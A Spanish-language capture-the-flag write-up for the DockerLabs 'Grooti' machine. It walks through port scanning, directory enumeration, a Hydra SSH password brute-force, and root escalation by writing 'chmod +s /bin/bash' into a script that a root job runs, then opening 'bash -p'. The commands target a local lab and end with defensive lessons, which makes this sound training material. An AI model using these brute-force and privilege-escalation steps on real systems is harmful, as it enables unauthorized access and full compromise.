# Grooti — DockerLabs

| Campo        | Detalle                                                              |
|--------------|----------------------------------------------------------------------|
| 🏷️ Plataforma | DockerLabs                                                           |
| 💻 SO         | Linux                                                                |
| 📊 Dificultad | Media                                                                |
| 🔑 Técnicas   | Nmap, Gobuster, SQL, Hydra, SSH, SUID Privilege Escalation           |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Descubrimiento de directorios ocultos](#3-descubrimiento-de-directorios-ocultos)
4. [Página secreta y SQL](#4-página-secreta-y-sql)
5. [Generación del diccionario y ataque con Hydra](#5-generación-del-diccionario-y-ataque-con-hydra)
6. [Acceso SSH](#6-acceso-ssh)
7. [Escalada de privilegios — SUID](#7-escalada-de-privilegios--suid)
8. [Conclusiones](#8-conclusiones)

---

## 1. Reconocimiento

Desplegamos la máquina y realizamos un escaneo completo de puertos:

```bash
sudo nmap -T5 -sS -sC -sV -vvvv -Pn -n 172.17.0.2
```

![Escaneo Nmap](imgs/Pasted%20image%2020260806174834.png)

El escaneo revela tres puertos abiertos:
- 🔵 **22/tcp** — SSH
- 🔵 **80/tcp** — HTTP
- 🔵 **3306/tcp** — MySQL

---

## 2. Enumeración web

Accedemos al servicio web en `http://172.17.0.2:80` y encontramos una aplicación con tres secciones: **Mis fotos**, **Mi base de datos** y **Facturas de la nave**.

![Web principal](imgs/Pasted%20image%2020260806181426.png)

Dentro de **Mis fotos** encontramos un directorio con un `readme.txt` y un `grooti.jpg`. El `readme.txt` contiene una contraseña — la anotamos para usarla más adelante. 🔑

![Directorio fotos](imgs/Pasted%20image%2020260806181727.png)

---

## 3. Descubrimiento de directorios ocultos

Lanzamos **Gobuster** para enumerar rutas ocultas:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x py,txt,sh,bak
```

![Gobuster resultado](imgs/Pasted%20image%2020260806183843.png)

Gobuster descubre el directorio `/secret/` — lo investigamos a continuación.

---

## 4. Página secreta y SQL

Accedemos a `http://172.17.0.2/secret/` y encontramos una tabla junto a un fichero `instrucciones.txt` con un comando al final:

![Directorio secret](imgs/Pasted%20image%2020260806191138.png)

Usando SQL para consultar el contenido de la tabla, descubrimos la existencia del directorio `/unprivate/secret`:

![SQL resultado](imgs/Pasted%20image%2020260806193503.png)

Navegamos a `http://172.17.0.2/unprivate/secret/`:

![Página secreta](imgs/Pasted%20image%2020260806195839.png)

---

## 5. Generación del diccionario y ataque con Hydra

La página nos pide combinar las pistas obtenidas — `password1` y `grooti` — para deducir el nombre del archivo descargable que contiene el diccionario de contraseñas.

> 💡 La lógica: `password1` (9 chars) + `grooti` (6 chars) + carácter extra del script (1) = **16 caracteres** en total.

Descargamos el diccionario `password16.txt` e introducimos los valores correctos:

![Descarga diccionario](imgs/Pasted%20image%2020260806202150.png)

Con el diccionario en mano lanzamos **Hydra** contra el servicio SSH:

```bash
hydra -l grooti -P /home/kali/Desktop/password16.txt ssh://172.17.0.2
```

![Hydra resultado](imgs/Pasted%20image%2020260806202410.png)

✅ Hydra encuentra las credenciales del usuario `grooti`.

---

## 6. Acceso SSH

Accedemos a la máquina con las credenciales obtenidas:

```bash
ssh grooti@172.17.0.2
```

![Acceso SSH](imgs/Pasted%20image%2020260806202645.png)

Explorando el sistema encontramos dos scripts:
- `malicious.sh` — podemos leerlo, editarlo y ejecutarlo ✅
- `cleanup.sh` — sin permisos de escritura ❌, pero **root lo ejecuta periódicamente en segundo plano**

> 💡 `cleanup.sh` llama a `/tmp/malicious.sh` y la carpeta `/tmp` es pública — esto es nuestra vía de escalada.

---

## 7. Escalada de privilegios — SUID

Modificamos `/tmp/malicious.sh` para que cuando root lo ejecute, añada el bit **SUID** a `/bin/bash`:

```bash
echo -e "#!/bin/bash\nchmod +s /bin/bash" > /tmp/malicious.sh
```

> 🔑 El bit SUID hace que `/bin/bash` se ejecute con los privilegios de su propietario — que es `root`.

Esperamos a que `cleanup.sh` ejecute el script y verificamos:

```bash
ls -la /bin/bash
```

![SUID activado](imgs/Pasted%20image%2020260806205043.png)

Con el SUID activo, obtenemos una shell como root:

```bash
bash -p
```

Navegamos a `/root` y leemos la flag:

```bash
cd /root
cat grooti.txt
```

![Flag](imgs/Pasted%20image%2020260806212430.png)

🎉 ¡Máquina comprometida!

---

## 8. Conclusiones

Esta máquina combina enumeración web, ingeniería inversa de pistas y escalada de privilegios mediante SUID. Un recorrido completo muy representativo de un pentest real.

**Lecciones clave:**
- 🔒 Nunca almacenar contraseñas en archivos accesibles públicamente.
- 🔒 Restringir permisos de escritura en `/tmp` para usuarios no privilegiados.
- 🔒 Auditar scripts ejecutados por root — especialmente si referencian rutas en directorios públicos.

---

*Writeup realizado con fines educativos en un entorno controlado.* 🛡️
